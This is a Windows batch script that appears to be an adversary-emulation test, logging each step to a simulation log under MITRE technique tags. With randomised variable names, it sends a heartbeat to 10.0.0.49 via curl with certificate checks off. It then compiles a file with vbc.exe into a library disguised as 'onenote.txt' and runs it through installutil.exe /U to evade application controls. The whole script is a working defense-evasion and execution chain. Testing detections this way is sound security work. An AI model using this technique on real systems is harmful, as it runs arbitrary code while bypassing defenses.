@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9994\471b6e2c
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9994-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=onenote.txt
SET njozco=file.txt
SET kkjwr=9994
SET zqkwekl=!APPDATA!\!ufeybybm!\macula-simulations.log
SET fgsshr=!SystemRoot!\Microsoft.NET\Framework64\v4.0.30319
IF NOT EXIST "!APPDATA!\!ufeybybm!\" MD "!APPDATA!\!ufeybybm!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!zqkwekl!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_complete=>> "!zqkwekl!" 2>nul

IF NOT EXIST "!recnn!\" (SET cszkrf=0&SET kvech=directory_not_found) ELSE (cd /d "!recnn!" 2>nul&&SET cszkrf=1&SET kvech=)
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir=!cszkrf!>> "!zqkwekl!" 2>nul
IF !cszkrf!==0 EXIT /B 1

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_start=>> "!zqkwekl!" 2>nul
"%fgsshr!\vbc.exe" /target:library /reference:System.Configuration.Install.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
IF EXIST "!hpnjatpj!" (SET ltnbnr=1&SET mzxqym=) ELSE (SET ltnbnr=0&SET mzxqym=assembly_compile_failed)
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_complete=!ltnbnr!>> "!zqkwekl!" 2>nul
echo [!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!ltnbnr!>> "!zqkwekl!" 2>nul

IF !ltnbnr!==1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: installutil_start=>> "!zqkwekl!" 2>nul
    "%fgsshr!\installutil.exe" /logfile= /LogToConsole=false /U "!hpnjatpj!" >nul 2>&1
    IF !ERRORLEVEL!==0 (SET gtfgtd=1&SET suokpc=) ELSE (SET gtfgtd=0&SET suokpc=execution_failed)
    echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: installutil_complete=!gtfgtd!>> "!zqkwekl!" 2>nul
    echo [!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1218|Signed Binary Proxy Execution=!gtfgtd!:!suokpc!>> "!zqkwekl!" 2>nul
)
ENDLOCAL